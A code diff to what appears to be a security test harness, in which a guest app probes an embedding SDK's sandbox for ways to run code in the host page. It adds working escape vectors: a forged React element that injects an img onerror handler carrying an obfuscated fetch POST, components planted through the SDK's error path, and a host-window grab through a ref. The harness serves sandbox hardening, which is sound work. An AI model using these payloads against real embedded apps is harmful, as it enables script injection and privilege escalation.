@@ -104,6 +104,31 @@ const makeEscapeIframeElement = (onWindow: (w: Window | null) => void) => ({
 });
 
 /**
+ * An element that carries its payload as *markup* rather than as a tag, so it
+ * never goes through `createElement` at all — host React assigns it with
+ * `innerHTML`. The inline `onerror` then runs in the HOST realm, where `fetch`
+ * is not sandboxed. Base64 avoids quoting conflicts inside the attribute.
+ */
+const makeInnerHtmlEscapeElement = (target: string, payload: unknown) => {
+  const script = `fetch(atob('${btoa(target)}'),{method:'POST',headers:{'content-type':'application/json'},body:atob('${btoa(
+    JSON.stringify(payload),
+  )}')})`;
+
+  return {
+    $$typeof: Symbol.for("react.element"),
+    type: "div",
+    key: null,
+    ref: null,
+    props: {
+      dangerouslySetInnerHTML: {
+        __html: `<img src="x-invalid" onerror="${script}">`,
+      },
+    },
+    _owner: null,
+  };
+};
+
+/**
  * When the app runs on guest React, rendering a blocked tag makes the guest
  * `createElement` throw inside the reconciler. This boundary catches that so the
  * outcome is reported as `blocked:` instead of tearing down the whole tree.
@@ -144,6 +169,16 @@ export default function App() {
       .catch((err) => setResult(`blocked:${describeError(err)}`));
   };
 
+  // Called from inside an attacker component while HOST React renders it. It
+  // distinguishes "the guard refused the element" from "the probe never ran" —
+  // both otherwise look like a silent no-op from the guest side. A real escape
+  // still overwrites this with `escaped:` once the fetch resolves.
+  const markHostRenderReached = () => {
+    setResult((current) =>
+      current === "pending" ? "blocked:host-render-reached" : current,
+    );
+  };
+
   // Some vectors are blocked host-side, where the guest can't observe the throw —
   // the attempt simply never reaches `escapeVia`. Report that instead of leaving
   // the result at "pending", which would look like the probe never ran.
@@ -152,7 +187,7 @@ export default function App() {
       setResult((current) =>
         current === "pending" ? "blocked:no-escape-observed" : current,
       );
-    }, 5000);
+    }, 10000);
   };
 
   const runCreateElement = () => {
@@ -240,7 +275,12 @@ export default function App() {
         return;
       }
 
-      mountViaBridge(bundle.InteractiveQuestion, {
+      // Mount `ComponentProvider` as the component: it is a genuine bundle export
+      // (so it passes the bridge's identity check) and, unlike a question, it
+      // renders whatever `children` it is given — so the smuggled element really
+      // reaches host React instead of being dropped with an unresolved question.
+      mountViaBridge(bundle.ComponentProvider, {
+        ...getProviderProps(),
         children: makeEscapeIframeElement(escapeVia),
       });
     } catch (err) {
@@ -267,18 +307,15 @@ export default function App() {
         return;
       }
 
-      // A plain action object — the reducer matches on `type`, so the guest does
-      // not need the (un-endowed) action creator.
-      store.dispatch({
-        type: "sdk/SET_ERROR_COMPONENT",
-        payload: () => makeEscapeIframeElement(escapeVia),
-      });
-
       const bridge = getMountBridge();
       if (!bridge || !bundle) {
         setResult("blocked:no-bridge");
         return;
       }
+
+      // Mount FIRST and let it settle into its error state: `ComponentProvider`
+      // syncs `errorComponent` from its own props on mount, so anything planted
+      // beforehand is immediately overwritten with `null`.
       const container = document.createElement("div");
       document.body.appendChild(container);
       bridge(
@@ -288,6 +325,82 @@ export default function App() {
         bundle.StaticQuestion,
         { questionId: 999999999 },
       );
+
+      // Now plant the component. `SdkError` reads it through a selector, so the
+      // already-rendered error state re-renders with the attacker's component.
+      // A plain action object suffices — the reducer matches on `type`, so the
+      // guest never needs the (un-endowed) action creator.
+      window.setTimeout(() => {
+        store.dispatch?.({
+          type: "sdk/SET_ERROR_COMPONENT",
+          payload: () => {
+            markHostRenderReached();
+            return makeEscapeIframeElement(escapeVia);
+          },
+        });
+      }, 2000);
+    } catch (err) {
+      setResult(`blocked:${describeError(err)}`);
+    }
+  };
+
+  // Mount a trusted SDK component whose error state renders the given guest
+  // `errorComponent` host-side — the one path proven to reach host React.
+  const mountWithErrorComponent = (errorComponent: unknown) => {
+    const bridge = getMountBridge();
+    const bundle = getSdkBundle();
+    if (!bridge || !bundle) {
+      setResult("blocked:no-bridge");
+      return;
+    }
+    const container = document.createElement("div");
+    document.body.appendChild(container);
+    bridge(
+      container,
+      bundle.ComponentProvider,
+      { ...getProviderProps(), errorComponent },
+      bundle.StaticQuestion,
+      { questionId: 999999999 },
+    );
+  };
+
+  // Vector 7: markup instead of a tag. `dangerouslySetInnerHTML` never reaches
+  // `createElement`, so the host element guard doesn't see it; the inline
+  // `onerror` executes in the host realm with an ungated `fetch`.
+  const runInnerHtmlEscape = () => {
+    try {
+      mountWithErrorComponent(() => {
+        markHostRenderReached();
+        return makeInnerHtmlEscapeElement(env.target, env.payload);
+      });
+      // The payload runs host-side and can't report back into guest state, so the
+      // ground-truth assertion (was the admin provisioned?) decides this one.
+      window.setTimeout(() => setResult("attempted:inner-html"), 4000);
+    } catch (err) {
+      setResult(`blocked:${describeError(err)}`);
+    }
+  };
+
+  // Vector 8: reach the host window through a host DOM node handed to a guest
+  // `ref`, and fetch from there instead of from the guest's own global.
+  const runRefHostWindow = () => {
+    reportIfNothingHappened();
+    try {
+      mountWithErrorComponent(() => {
+        markHostRenderReached();
+        return {
+          $$typeof: Symbol.for("react.element"),
+          type: "div",
+          key: null,
+          ref: (element: HTMLElement | null) => {
+            if (element) {
+              escapeVia(element.ownerDocument?.defaultView);
+            }
+          },
+          props: {},
+          _owner: null,
+        };
+      });
     } catch (err) {
       setResult(`blocked:${describeError(err)}`);
     }
@@ -343,7 +456,10 @@ export default function App() {
       document.body.appendChild(container);
       const providerProps = {
         ...getProviderProps(),
-        errorComponent: () => makeEscapeIframeElement(escapeVia),
+        errorComponent: () => {
+          markHostRenderReached();
+          return makeEscapeIframeElement(escapeVia);
+        },
       };
       // A missing question id drives the SDK into its error state.
       bridge(container, bundle.ComponentProvider, providerProps, bundle.StaticQuestion, {
@@ -407,6 +523,12 @@ export default function App() {
           onClick={runStoreDispatchPlant}
         >
           Plant component via store dispatch
+        </button>
+        <button data-testid="escape-inner-html" onClick={runInnerHtmlEscape}>
+          Escape via dangerouslySetInnerHTML
+        </button>
+        <button data-testid="escape-ref-host-window" onClick={runRefHostWindow}>
+          Escape via host window from ref
         </button>
       </div>
 
